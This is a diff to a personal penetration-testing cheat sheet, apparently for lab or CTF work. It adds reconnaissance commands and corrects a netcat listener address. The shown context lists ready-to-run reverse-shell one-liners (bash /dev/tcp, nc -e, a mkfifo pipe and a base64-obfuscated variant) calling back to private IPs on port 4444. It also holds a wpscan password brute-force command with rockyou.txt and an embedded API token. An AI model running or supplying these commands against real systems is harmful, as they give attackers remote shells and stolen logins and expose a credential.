@@ -22,9 +22,13 @@ TOOLS:
 	rpcinfo -p 10.80.140.153
 	showmount -e 10.80.140.153
 	wpscan --url http://10.82.184.231/ -e u -P /usr/share/wordlists/rockyou.txt --api-token iOZsJVBaHaDImXmUt3UwABIudk56HsYWWIkIZWCGDEY
+	subfinder -d example.com
+	webanalyze -hosts domains1.txt  -update > technologies.txt
+	cat domains1.txt | getallurls | grep '=' >> all_parameters.txt
+	nuclei -target http://example.com
 REVERSE SHELL:
 	/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.130.31/4444 0>&1"
-	nc 192.168.130.36 4444 -e /bin/bash
+	nc 192.168.130.31 4444 -e /bin/bash
 	rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.130.36 4444 > /tmp/f
 	X=$(echo "YmFzaAo=" | base64 -d); echo "L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzAuMzYvNDQ0NCAwPiYxIgo" | base64 -d | $X
 REVERSE SHELL UPGRADE:
@@ -45,7 +49,8 @@ PRIVILEGE ESCALATION:
 	
 OTHER:
 	ssh-keygen -f <compromised_user>
-	sudo tcpdump -i icmp
+	sudo tcpdump -i tun0 icmp
 	sudo nc -l -p 4444
 	mysql -u root -p
 	/usr/share/exploitdb/exploits/
+
